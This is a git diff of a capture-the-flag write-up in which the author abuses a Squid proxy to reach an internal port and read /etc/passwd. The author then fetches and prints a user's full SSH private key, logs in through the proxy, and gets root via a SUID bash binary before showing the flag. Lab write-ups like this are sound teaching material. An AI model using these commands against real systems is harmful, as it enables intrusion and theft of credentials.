@@ -9,14 +9,26 @@ Escalate your privileges and find the flag in root's home directory.
 Yes, the error message you see on startup is intentional. ;)
 
 ## Procedure
-1
 
+When we connect to the server, we can see the following
 
+<img width="1225" alt="Screenshot 2024-10-25 at 11 22 13 AM" src="https://github.com/user-attachments/assets/87f90689-cded-478d-b0e0-9a56a7ee310a" />
 
+The server is [squid proxy server](https://www.squid-cache.org), so the challenge here is use the proxy to try to access to internal resources, like other machines into the network 10.128.0.0/24 or maybe the same server.
 
+We will start checking what ports are open in the same server, and we can see the port 22 and 50000 open.
 
-curl --proxy "challenge.ctf.games:30912" "http://permission-to-proxy-435ee5c1b183e84e-85bb87f785-96qzd:50000/home/user/.ssh/id_rsa" 
+<img width="1200" alt="Screenshot 2024-10-25 at 11 22 58 AM" src="https://github.com/user-attachments/assets/4e320b19-4989-4ddb-b946-dca060b2cdf9" />
 
+<img width="1207" alt="Screenshot 2024-10-25 at 11 23 15 AM" src="https://github.com/user-attachments/assets/5a29a129-4774-4dac-a2e4-dce810f05507" />
+
+the tcp 22 is about SSH service, but TCP 50000 shows us a linux directory with path ```/```, now we can try to read an ssh key to try to access into the machine using ssh with squid proxy.
+
+<img width="987" alt="Screenshot 2024-10-25 at 11 23 51 AM" src="https://github.com/user-attachments/assets/2fa48d5a-8f2d-4887-9613-632391c38683" />
+
+The file ```/etc/passwd``` shows us the username ```user```, and using the command ```curl --proxy "challenge.ctf.games:30912" "http://permission-to-proxy-435ee5c1b183e84e-85bb87f785-96qzd:50000/home/user/.ssh/id_rsa" ``` we can recover the ssh key for user.
+
+```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAuStnFULtDuuXg/88vDIueIG4XwZSspmxb0yFq980I8b9so8UCg9g
@@ -55,10 +67,24 @@ Y3asm6T2UTYqJBIk4ExfjbzdumGg02mMqq2PkgoPeTlp4YcylcLVdk+QYjGht2Zd/FXo2I
 ILg6caPMqT/qDAkNbfo0etELH1+UtSb6mXrqAH1BlFjXc9H2XFnpFa5kda14ukZHuCl/nZ
 JauN0ipko/W2sAAAAJa2FsaUBrYWxpAQI=
 -----END OPENSSH PRIVATE KEY-----
+```
 
+Now we can connect to the remote server using the squid proxy server and the ssh service.
 
-chmod 400 id_rsa_proxy 
+set permission for ssh key with command ```chmod 400 id_rsa_proxy ```
 
-ssh -i id_rsa_proxy -o "ProxyCommand=socat - PROXY:challenge.ctf.games:%h:%p,proxyport=30912" user@permission-to-proxy-435ee5c1b183e84e-85bb87f785-96qzd
+Connect to remote server with the command ```ssh -i id_rsa_proxy -o "ProxyCommand=socat - PROXY:challenge.ctf.games:%h:%p,proxyport=30912" user@permission-to-proxy-435ee5c1b183e84e-85bb87f785-96qzd```
 
-flag{c9bbd4888086111e9f632d4861c103f1}
+![Screenshot 2024-10-25 at 11 27 33 AM](https://github.com/user-attachments/assets/46487afc-40dd-4654-b7df-4af311607940)
+
+We are in!! :) . We need to get root permission to read flag.txt file, start checking for SUID permission with command ```find / -perm -u=s -type f 2>/dev/null```, this show the binary  ```/bin/bash```
+
+![Screenshot 2024-10-25 at 11 28 44 AM](https://github.com/user-attachments/assets/36c4d0e9-0d75-42cb-94b2-5ed23b493cde)
+
+Is enough just run ```./bash -p ``` to jump into root group and then read the flag.
+
+![Screenshot 2024-10-25 at 11 29 23 AM](https://github.com/user-attachments/assets/39a1a4a9-29f9-43ed-9f57-3ca254bacc78)
+
+![Screenshot 2024-10-25 at 11 29 49 AM](https://github.com/user-attachments/assets/9042b82e-54a3-4277-bfb1-9980720b4d00)
+
+flag ```flag{c9bbd4888086111e9f632d4861c103f1}```
